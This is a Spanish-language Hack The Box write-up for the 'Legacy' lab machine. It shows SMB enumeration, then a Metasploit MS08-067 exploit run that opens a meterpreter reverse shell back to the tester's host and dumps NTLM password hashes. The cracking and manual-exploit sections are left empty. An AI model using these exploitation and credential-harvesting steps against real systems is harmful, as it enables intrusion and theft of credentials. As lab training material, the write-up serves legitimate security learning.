# Fz3r0 - Hack The Box - Legacy

- Keywords: `Windows` `Eternal Blue` ``

## Datos de los objetos involucrados: 


- [⭕] Host Atactante IP (local):.................. 192.168.30.148

- [🔴] **LHOST** - Host Atactante IP (túnel):...... 10.10.14.10

- [🔵] **RHOST** - Host Víctima IP/Dominio.TLD:.... 10.10.10.4


## Resultados de Auditoría de Sistema Operativo: 


- [🔵] Reporte de auditoría a Víctima/RHOST:....... 10.10.10.4

- [🟢] Estado Actual de Víctima/RHOST:............. Host Activo

- [🔵] Sistema Operativo de Víctima/RHOST.......... Windows

- [🔵] Resultados basados en TTL:.................. 127

- [⚪] Fecha de Auditoría y Muestreo:.............. 2022-12-28 20:31:50

- [💀] Auditoría de Seguridad realizada por:....... Fz3r0 💀

## Resultados Preliminares de Auditoría de Puertos: 


- [🔴] Se encontraron <(( 3 ))> Puertos ABIERTOS en Víctima/RHOST:

    - [💀] -->> **` 135,139,445 `**


## Resultados Avanzados de Auditoría de Puertos & Servicios: 


- [🔴] Detalles de Servicios & Versiones en sockets de Víctima/RHOST: 

    - [💀] -->>  135/tcp open  msrpc        Microsoft Windows RPC


    - [💀] -->>  139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn


    - [💀] -->>  445/tcp open  microsoft-ds Windows XP microsoft-ds


## Auditoría Preliminar de Vulnerabilidades en Víctima/RHOST: 


- [💀] **Se han encontrado las siguientes posibles vulnerabilidades en la Víctima:**

```
|_smb-vuln-ms10-054: false

| smb-vuln-ms17-010: 

|   VULNERABLE:

|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)

|     State: VULNERABLE

|     IDs:  CVE:CVE-2017-0143

|     Risk factor: HIGH

|       A critical remote code execution vulnerability exists in Microsoft SMBv1

|        servers (ms17-010).

|           

|     Disclosure date: 2017-03-14

|     References:

|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

| smb-vuln-ms08-067: 

|   VULNERABLE:

|   Microsoft Windows system vulnerable to remote code execution (MS08-067)

|     State: VULNERABLE

|     IDs:  CVE:CVE-2008-4250

|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,

|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary

|           code via a crafted RPC request that triggers the overflow during path canonicalization.

|           

|     Disclosure date: 2008-10-23

|     References:

|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250

|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx

|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED

|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)



```

## SMB Enum

### `crackmapexec `

```sh
┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Legacy]
└─$ crackmapexec smb $ip_target
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing SMB protocol database
[*] Initializing FTP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing LDAP protocol database
[*] Initializing RDP protocol database
[*] Initializing WINRM protocol database
[*] Initializing SSH protocol database
[*] Copying default configuration file
[*] Generating SSL certificate

SMB         10.10.10.4      445    LEGACY           [*] Windows 5.1 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
```

- `SMB         10.10.10.4      445    LEGACY           [*] Windows 5.1 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)`





## Exploit [Opción 1] - (Metasploit- `windows/smb/ms08_067_netapi`)



- En realidad es straight PWN.... la clásica de Eternal Blue pero con `MS08-067`

- `msfconsole`

- Selección de módulo:

```
msf6 > search MS08-067

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi

msf6 > use 0
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > 
```

- Exploit:

```
msf6 exploit(windows/smb/ms08_067_netapi) > options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.10.10.4       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.10      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.10:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175686 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.10:4444 -> 10.10.10.4:1035) at 2022-12-28 20:59:34 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

## Post Exploit

### Credential Harvesting

- `hashdump`

```
meterpreter > hashdump
Administrator:500:b47234f31e261b47587db580d0d5f393:b1e8bd81ee9a6679befb976c0b9b6827:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:0ca071c2a387b648559a926bfe39f8d7:332e3bd65dbe0af563383faff76c6dc5:::
john:1003:dc6e5a1d0d4929c2969213afe9351474:54ee9a60735ab539438797574a9487ad:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:f2b8398cafc7174be746a74a3a7a3823:::
meterpreter > 
```

- Cracking with `john`

```sh

```

## Flag Capture

```
meterpreter > search -f *.txt
Found 50 results...
===================
.
.
.

(buscar user.txt y root.txt)
```

- Ir al directorio y listo!

## Exploit [Opción 2] - Manual

nmap --script "vuln and safe" -p445 $ip_target



